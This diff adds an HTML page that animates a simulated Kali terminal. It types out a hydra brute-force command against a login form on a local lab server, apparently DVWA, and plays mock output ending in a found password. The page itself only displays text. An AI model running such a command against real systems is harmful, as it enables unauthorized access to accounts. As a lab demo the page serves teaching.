@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Kali Terminal Simulation</title>
+    <style>
+        body {
+            background-color: #1e1e1e;
+            color: #ccc;
+            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+            font-size: 16px;
+            padding: 20px;
+            margin: 0;
+            overflow: hidden;
+        }
+        .prompt {
+            color: #87d7ff; /* Blue-ish for directory */
+            font-weight: bold;
+        }
+        .user {
+            color: #d70000; /* Red for root */
+            font-weight: bold;
+        }
+        .command {
+            color: #ffffff;
+        }
+        .cursor {
+            display: inline-block;
+            width: 10px;
+            height: 18px;
+            background-color: #ccc;
+            animation: blink 1s infinite;
+            vertical-align: middle;
+        }
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+        #output {
+            margin-top: 10px;
+            white-space: pre-wrap;
+            color: #ccc;
+        }
+        .success {
+            color: #00ff00;
+            font-weight: bold;
+        }
+        .info {
+            color: #dadada;
+        }
+        .header {
+            color: #ffd700;
+        }
+    </style>
+</head>
+<body>
+    <div id="terminal">
+        <div>
+            <span class="user">root@kali</span>:<span class="prompt">~/labs</span># 
+            <span id="typed-command" class="command"></span><span class="cursor"></span>
+        </div>
+        <div id="output"></div>
+    </div>
+
+    <script>
+        const commandText = 'hydra -l admin -P /usr/share/wordlists/passwords.txt -s 8081 localhost http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: security=medium; PHPSESSID=...:F=incorrect"';
+        const outputLines = [
+            "\n[DATA] max 16 tasks per 1 server, overall at 16 tasks/min",
+            "[DATA] attacking localhost:8081",
+            "[VERBOSE] resolving service",
+            "[INFO] attacking http-get-form://localhost:8081/vulnerabilities/brute/",
+            "[ATTEMPT] target localhost - login \"admin\" - pass \"123456\" - 1 of 52",
+            "[ATTEMPT] target localhost - login \"admin\" - pass \"qwerty\" - 2 of 52",
+            "[ATTEMPT] target localhost - login \"admin\" - pass \"letmein\" - 3 of 52",
+            "[ATTEMPT] target localhost - login \"admin\" - pass \"dragon\" - 4 of 52",
+            "[ATTEMPT] target localhost - login \"admin\" - pass \"baseball\" - 5 of 52",
+            "[ATTEMPT] target localhost - login \"admin\" - pass \"monkey\" - 6 of 52",
+            "[ATTEMPT] target localhost - login \"admin\" - pass \"master\" - 7 of 52",
+            "\n[8081][http-get-form] host: localhost   login: admin   password: password\n",
+            "[STATUS] attack finished for localhost (waiting for threads to finish)",
+            "[INFO] 1 of 1 target successfully completed, 1 valid password found"
+        ];
+
+        let charIndex = 0;
+        const typeDelay = 50; // ms per char
+
+        function typeCommand() {
+            if (charIndex < commandText.length) {
+                document.getElementById('typed-command').textContent += commandText.charAt(charIndex);
+                charIndex++;
+                setTimeout(typeCommand, typeDelay);
+            } else {
+                // Command finished, run output
+                document.querySelector('.cursor').style.display = 'none'; // Hide cursor while running
+                setTimeout(runOutput, 500);
+            }
+        }
+
+        let lineIndex = 0;
+        function runOutput() {
+            if (lineIndex < outputLines.length) {
+                const line = outputLines[lineIndex];
+                const div = document.createElement('div');
+                div.textContent = line;
+                
+                if (line.includes("password: password")) {
+                    div.innerHTML = line.replace("password: password", "<span class='success'>password: password</span>");
+                }
+                
+                document.getElementById('output').appendChild(div);
+                lineIndex++;
+                
+                // Variable processing speed mock
+                let nextDelay = 100;
+                if (line.includes("[ATTEMPT]")) nextDelay = 200;
+                if (line.includes("password: password")) nextDelay = 1000; // Pause for dramatic effect
+
+                setTimeout(runOutput, nextDelay);
+            } else {
+                 // Blink cursor again at the end
+                 const promptDiv = document.createElement('div');
+                 promptDiv.innerHTML = '<br><span class="user">root@kali</span>:<span class="prompt">~/labs</span># <span class="cursor" style="display:inline-block"></span>';
+                 document.getElementById('terminal').appendChild(promptDiv);
+            }
+        }
+
+        // Start after a brief pause
+        setTimeout(typeCommand, 1000);
+    </script>
+</body>
+</html>
